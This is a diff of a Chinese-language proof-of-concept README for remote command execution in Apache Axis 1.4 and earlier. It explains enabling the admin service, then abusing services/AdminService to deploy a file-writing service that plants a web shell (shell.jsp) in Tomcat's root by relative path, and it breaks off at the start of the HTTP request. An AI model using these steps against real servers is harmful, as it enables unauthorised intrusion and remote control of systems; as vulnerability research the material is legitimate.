@@ -1,16 +1,16 @@
-## Axis 1.4   远程命令执行（RCE） POC
+## Axis <=1.4   远程命令执行（RCE） POC
 
 ###  环境准备
-首先下载Axis1.4 本仓库有一个打包好的axis直接解压到tomcat webapp下即可 ,web-inf/web.xml 去掉adminserver注释
+首先下载Axis1.4 本仓库有一个打包好的axis直接解压到tomcat webapps下即可 ,web-inf/web.xml 去掉AdminServlet注释
 
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/web-inf.jpg)
 
-然后，config开启enableremoteadmin （本地环境可以不管）
+然后，server-config.wsdd文件开启enableRemoteAdmin （本地环境可以不管）
 ![avatar](https://kibodwapon.github.io/2019/07/04/is-1-4-远程命令执行POC/config.jpg)
 本人部署在tomcat8上
 ### 利用
 #### 第一步：
-通过services/AdminService 服务 部署webservice ,service开启一个写文件服务。这里我们文件名是./webapps/ROOT/shell.jsp，服务模块的工作路径是bin目录，这里利用相对路径写入ROOT目录，也就是tomcat默认根目录。
+通过services/AdminService 服务 部署一个webservice ,webservice开启一个写文件服务。这里我们要写入的文件名是../webapps/ROOT/shell.jsp，服务模块的工作路径是bin目录，这里利用相对路径写入ROOT目录，也就是tomcat默认根目录。
 
 ```
 POST /axis/services/AdminService HTTP/1.1
